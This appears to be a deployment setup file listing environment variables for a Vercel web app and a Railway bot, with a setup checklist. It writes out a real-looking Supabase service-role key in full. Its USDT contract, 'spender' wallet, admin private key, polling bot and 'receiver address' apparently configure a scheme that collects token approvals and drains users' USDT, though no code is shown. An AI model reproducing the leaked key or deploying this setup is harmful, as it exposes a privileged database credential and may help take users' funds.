# VERCEL ENVIRONMENT VARIABLES (Copy & Paste)

Add these to your Vercel project:

```
NEXT_PUBLIC_SUPABASE_URL=https://ikookfufruxrepsfyciv.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlrb29rZnVmcnV4cmVwc2Z5Y2l2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzMzgxNTAsImV4cCI6MjA5MTkxNDE1MH0.gPOLWYgN6ffka9xgPC0QJwjQp2XEWYXlhWzoxns7Xms
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlrb29rZnVmcnV4cmVwc2Z5Y2l2Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjMzODE1MCwiZXhwIjoyMDkxOTE0MTUwfQ.USH8_ee_wek5fDByIaOEqG05IXAeAaMipmbMTY7JfS8
NEXT_PUBLIC_USDT_CONTRACT=0x55d398326f99059fF775485246999027B3197955
NEXT_PUBLIC_SPENDER_ADDRESS=[FILL_YOUR_ADMIN_WALLET_ADDRESS]
BSC_RPC_URL=https://bsc-dataseed.binance.org/
MORALIS_API_KEY=[FILL_YOUR_MORALIS_KEY]
ADMIN_PASSWORD=[FILL_YOUR_ADMIN_PASSWORD]
```

---

# RAILWAY ENVIRONMENT VARIABLES (Copy & Paste)

Add these to your Railway bot service:

```
NEXT_PUBLIC_SUPABASE_URL=https://ikookfufruxrepsfyciv.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlrb29rZnVmcnV4cmVwc2Z5Y2l2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzMzgxNTAsImV4cCI6MjA5MTkxNDE1MH0.gPOLWYgN6ffka9xgPC0QJwjQp2XEWYXlhWzoxns7Xms
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlrb29rZnVmcnV4cmVwc2Z5Y2l2Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjMzODE1MCwiZXhwIjoyMDkxOTE0MTUwfQ.USH8_ee_wek5fDByIaOEqG05IXAeAaMipmbMTY7JfS8
NEXT_PUBLIC_USDT_CONTRACT=0x55d398326f99059fF775485246999027B3197955
BSC_RPC_URL=https://bsc-dataseed.binance.org/
MORALIS_API_KEY=[FILL_YOUR_MORALIS_KEY]
ADMIN_PASSWORD=[FILL_YOUR_ADMIN_PASSWORD]
ADMIN_PRIVATE_KEY=[FILL_YOUR_ADMIN_WALLET_PRIVATE_KEY]
BOT_POLL_INTERVAL_MS=60000
```

---

# QUICK SETUP CHECKLIST

- [ ] You have your Supabase URL and keys (already filled in above)
- [ ] You have your admin wallet address (paste in both env files)
- [ ] You have your admin wallet private key (Railway only)
- [ ] You have a Moralis API key (get from https://moralis.io)
- [ ] You have chosen an admin password (minimum 12 chars recommended)
- [ ] You've created a GitHub repo and pushed the code
- [ ] You've deployed to Vercel with the first env var set above
- [ ] You've deployed to Railway with the second env var set above
- [ ] You've run the Supabase SQL schema (supabase/schema.sql)
- [ ] You've logged into /admin and set the receiver address
